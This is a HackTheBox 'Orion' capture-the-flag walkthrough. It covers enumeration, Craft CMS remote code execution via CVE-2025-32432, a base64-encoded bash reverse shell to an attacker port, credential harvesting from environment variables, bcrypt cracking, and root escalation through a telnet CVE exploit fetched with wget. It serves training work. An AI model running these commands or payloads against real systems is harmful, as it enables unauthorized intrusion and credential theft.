# **Orion**

![Dificultad](https://img.shields.io/badge/Dificultad-Easy-green)
![SO](https://img.shields.io/badge/SO-Linux-yellow)
![Plataforma](https://img.shields.io/badge/Plataforma-HackTheBox-9FEF00)

---

&nbsp;

## Resume

Discover website with nmap then add on /etc/hosts the ip. With gobuster discover the /admin directory. Exploit CVE-2025-32432 to access www-data user then search for database on .env file. Change to adam user, then exploit telnet's CVE-2026-24061 and aquire root. 

---

&nbsp;

## Enumeration

###  <u>Nmap</u>

- **First Nmap**: General assesment

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [IP]
```

- **Result:** Service Specifications
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-16 10:25 CEST
Initiating SYN Stealth Scan at 10:25
Scanning 10.129.102.182 [65535 ports]
Discovered open port 22/tcp on 10.129.102.182
Discovered open port 80/tcp on 10.129.102.182
Completed SYN Stealth Scan at 10:25, 18.47s elapsed (65535 total ports)
Nmap scan report for 10.129.102.182
Host is up, received user-set (0.14s latency).
Scanned at 2026-09-16 10:25:38 CEST for 18s
Not shown: 65184 closed tcp ports (reset), 349 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.58 seconds
           Raw packets sent: 91275 (4.016MB) | Rcvd: 83508 (3.340MB)

```

- **Second Nmap**

```bash
nmap  -sCV -p80,22 [IP]
```

- **Result:**

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-16 10:27 CEST
Nmap scan report for 10.129.102.182
Host is up (0.071s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.19 seconds
```

### Services Resume

- Port 22/tcp — SSH: Protocol to maintain a connexion between two devices
- Port 80/tcp — HTTP: Web aplication/page redirected to http://orion.htb/

### /etc/hosts

To access the webpage we add at the end of the `/etc/hosts` file the redirection to the mentioned page:

```
echo "[ip] orion.htb" | sudo tee -a /etc/hosts
```


###  <u>Web Aplication Fingerprinting</u>
- Use whatweb to see the specifications about the web app and the technologies used

```bash
whatweb http://orion.htb
```
- **Output**

```bash
http://orion.htb [200 OK] Country[RESERVED][ZZ], Email[your.email@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.102.182], Open-Graph-Protocol, PoweredBy[CraftCMS], Script, Title[Orion Telecom], UncommonHeaders[x-robots-tag], X-Powered-By[Craft CMS], nginx[1.18.0]
```
Confirmed that this web page is using <u>CraftCMS</u>.


###  <u>Directory Enumeration</u>

- Using *gobuster*

```bash
gobuster dir -u [url] -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
```
**Output**
```
/.html                (Status: 403) [Size: 162]
/index.php            (Status: 200) [Size: 12272]
/index.html           (Status: 200) [Size: 9689]
/index                (Status: 200) [Size: 12272]
/admin                (Status: 302) [Size: 0] [--> http://orion.htb/admin/login]
/assets               (Status: 301) [Size: 178] [--> http://orion.htb/assets/]
/logout               (Status: 302) [Size: 0] [--> http://orion.htb/]
```

On the admin panel we'll find the version of <u>CraftCMS</u>: `
Craft CMS 5.6.16`

---

# Foothold

With a quick search we'll find a CVE's PoC thats related to this service's version.

###  <u>CVE-2025-32432</u>

https://github.com/c0gnit00/CVE-2025-32432


```bash
python3 exploit.py -u http://orion.htb -c "id"
```

**Output**

```
  ==========================================================
   CVE-2025-32432 Craft CMS Pre-Auth RCE PoC v2              
   Target: http://orion.htb                                                                    
   Command: id                                                                               
  ==========================================================  

[+] Stage 1: Getting session cookie and CSRF token...
[✓] Session ID: 9lqohmlngmfml27ra94mrb6uov
[✓] CSRF Token: 9d3R56xr9LC03Z4dKVlZvhUAcctjjS...
[+] Stage 2: Poisoning session file with PHP code...
[+] Poison request returned: 200
[✓] Session file poisoned
[+] Stage 3: Brute-forcing asset ID (1-300)...
[✓] Valid asset ID found: 1 (HTTP 200)
[+] Stage 4: Triggering RCE via PhpManager gadget chain...
[+] Target session file: /var/lib/php/sessions/sess_9lqohmlngmfml27ra94mrb6uov
[+] Trigger request returned: 200
[✓] COMMAND OUTPUT:
============================================================
uid=33(www-data) gid=33(www-data) groups=33(www-data)
============================================================
```

The exploit was succesfull

- **Revershell**

```bash
# 1. Payload on base64 to avoid issues with special characters
echo 'setsid bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1' </dev/null >/dev/null 2>&1 &' | base64 -w 0

# 2. Listen to port
nc -nlvp 4444

# 3. Send payload
python3 exploit.py -u http://orion.htb -c "echo <BASE64> | base64 -d | bash"
```

We are in!

- Treat the terminal and go for user flag:

```bash
script /dev/null -c bash
# Ctrl + z 
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

---

## User Flag

- Once Inside start with usual enumeration.

On the environmental variables we'll find usefull info:

```bash
env
```
```
CRAFT_DB_PORT=3306
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
PWD=/var/www/html/craft/storage
PRIMARY_SITE_URL=http://orion.htb/
CRAFT_DB_DATABASE=orion
HOME=/var/www
CRAFT_DB_TABLE_PREFIX=
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
TERM=xterm
USER=www-data
SHLVL=4
CRAFT_DB_USER=root
LC_CTYPE=C.UTF-8
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
```

Here we find that the database is on a server that points to the port 3306 on a loopback address.

- Conect to the database and enumerate tables

```bash
mysql -h 127.0.0.1 -u root -p'SuperSecureCraft123Pass!' orion -e "SHOW TABLES;"
```

```bash
mysql -h 127.0.0.1 -u root -p'SuperSecureCraft123Pass!' orion -e "SELECT * FROM users;"
```

Inside we'll find a hash for `admin`:

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

The `2y`from the beginning telss us that's bcrypt.

- Use John The Ripper:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 0.00% (ETA: 2026-10-01 09:32) 0g/s 14.57p/s 14.57c/s 14.57C/s manuel..jessie
0g 0:00:00:14 0.00% (ETA: 2026-10-01 09:41) 0g/s 14.56p/s 14.56c/s 14.56C/s hellokitty..edward
0g 0:00:00:17 0.00% (ETA: 2026-10-02 02:58) 0g/s 14.53p/s 14.53c/s 14.53C/s oliver..brenda
0g 0:00:00:22 0.00% (ETA: 2026-10-02 11:54) 0g/s 14.52p/s 14.52c/s 14.52C/s strawberry..brianna
darkangel        (?)     
1g 0:00:01:06 DONE (2026-09-19 20:55) 0.01501g/s 10.27p/s 10.27c/s 10.27C/s gloria..010203
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- Change to user `adam` using the password aquierd.

The user flag is on adam's directory.

**User Flag:** Aquired!

---

## Privilege Escalation (Root Flag)

- Looking on the services running

```bash
ss -tulnp
```

We notice there is a port 23 open, which is the port for telnet.

- See the version of the service 

```bash
telnet --verison
```

The version `telnet 2.7` is vulnerable.

### <u>CVE-2026-24061</u>

https://github.com/sh4den/CVE-2026-24061


- Attacker
```bash
#Download on attacker machine
curl -O https://raw.githubusercontent.com/sh4den/CVE-2026-24061/main/main.py
#Open python server
python3 -m http.server 80
```

- On victim machine
```bash
#create a temporal directory
mktemp -d
#go to that directory and get the exploit
wget http://<your_ip>/main.py
#Give execute perms
chmod +x main.py
#Use exploit
python3 main.py -u localhost
```
Root user accomplished

- The root flag is on root directory.

**Root Flag:** Aquired!